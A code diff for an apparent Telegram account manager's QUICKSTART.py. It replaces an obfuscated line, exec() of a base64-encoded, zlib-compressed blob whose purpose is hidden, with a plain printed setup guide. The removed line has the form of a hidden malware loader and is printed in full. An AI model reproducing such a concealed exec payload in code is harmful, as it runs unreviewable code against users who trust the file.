@@ -1,2 +1,150 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b"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")))
+#!/usr/bin/env python3
+"""
+TELEGRAM ACCOUNT MANAGER - QUICK START GUIDE
+
+This script provides step-by-step instructions to set up and run the application.
+"""
+
+import os
+import sys
+from pathlib import Path
+
+SETUP_GUIDE = """
+╔════════════════════════════════════════════════════════════════════╗
+║    📱 TELEGRAM ACCOUNT MANAGER - SETUP GUIDE                      ║
+╚════════════════════════════════════════════════════════════════════╝
+
+STEP 1: GET TELEGRAM API CREDENTIALS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. Visit: https://my.telegram.org/
+2. Login with your phone number
+3. Go to "API development tools"
+4. Click "Create new application"
+5. Fill the form and get:
+   ✓ API_ID (numeric, e.g., 12345678)
+   ✓ API_HASH (alphanumeric, e.g., a1b2c3d4e5f6...)
+
+STEP 2: INSTALL DEPENDENCIES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+$ pip install -r requirements.txt
+
+Required packages:
+  • streamlit       - Web UI framework
+  • telethon        - Telegram client library
+  • python-dotenv   - Environment configuration
+  • pandas          - Data handling
+  • cryptography    - Credential encryption
+
+STEP 3: CONFIGURE (OPTIONAL)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Create a .env file in project root (optional):
+
+    API_ID=12345678
+    API_HASH=a1b2c3d4e5f6...
+
+Or enter them directly in the UI.
+
+STEP 4: RUN THE APPLICATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+$ streamlit run streamlit_app.py
+
+The app will open at: http://localhost:8501
+
+STEP 5: LOGIN TO YOUR ACCOUNT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. Go to "🔐 Login" tab
+2. Enter API ID and API Hash
+3. Enter your phone number (+1234567890)
+4. Click "🔐 Send OTP"
+5. Enter the OTP code from Telegram
+6. (If enabled) Enter 2FA password
+7. Click "✅ Verify & Login"
+
+STEP 6: VIEW ACCOUNT INFORMATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Go to "📊 Account Info" tab to see:
+  • User profile (ID, name, username)
+  • Account status (premium, bot type)
+  • All chats and groups
+  • Unread message counts
+
+TROUBLESHOOTING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❌ "Invalid phone number format"
+   → Use: +CountryCodeNumber (e.g., +1234567890)
+
+❌ "Too many login attempts"
+   → Wait the specified time, then retry
+
+❌ "OTP verification failed"
+   → Codes expire after ~5 minutes
+   → Request a new code if needed
+
+❌ "Module not found" errors
+   → Run: pip install -r requirements.txt
+
+FEATURES OVERVIEW
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✅ Multiple Accounts   - Manage several Telegram accounts
+✅ OTP Verification    - Secure login with 2FA support
+✅ Account Info        - View profiles and statistics
+✅ Chat Management     - See all chats, groups, and messages
+✅ Local Storage       - All data stored locally (~/.telegram_sessions/)
+✅ Secure             - Credentials encrypted when possible
+✅ User-Friendly UI    - Clean Streamlit interface
+
+SECURITY NOTES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔒 Sessions stored locally at: ~/.telegram_sessions/
+🔒 Never share your API credentials
+🔒 Never share your .env file
+🔒 Never share your 2FA password
+🔒 Run only on trusted machines
+🔒 Check .env is in .gitignore
+
+FILE STRUCTURE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Telegram-X/
+├── streamlit_app.py       ← Main application (run this)
+├── requirements.txt       ← Dependencies
+├── README.md             ← Full documentation
+├── QUICKSTART.py         ← This file
+├── .env                  ← Configuration (create this)
+├── .gitignore           ← Git ignore file
+└── ~/.telegram_sessions/ ← Session storage (auto-created)
+
+NEXT STEPS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. ✓ Get API credentials from my.telegram.org
+2. ✓ Run: pip install -r requirements.txt
+3. ✓ Run: streamlit run streamlit_app.py
+4. ✓ Login and enjoy!
+
+📚 DOCUMENTATION FILES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📖 README.md              - Full project documentation
+📋 USAGE_GUIDE.md         - Complete feature guide with examples
+🎯 QUICK_REFERENCE.md     - Quick reference for all inputs & buttons
+🚀 QUICKSTART.py          - This file
+
+Questions? Check USAGE_GUIDE.md for detailed instructions.
+
+═══════════════════════════════════════════════════════════════════════
+Made with ❤️  using Streamlit & Telethon
+═══════════════════════════════════════════════════════════════════════
+"""
+
+if __name__ == "__main__":
+    print(SETUP_GUIDE)
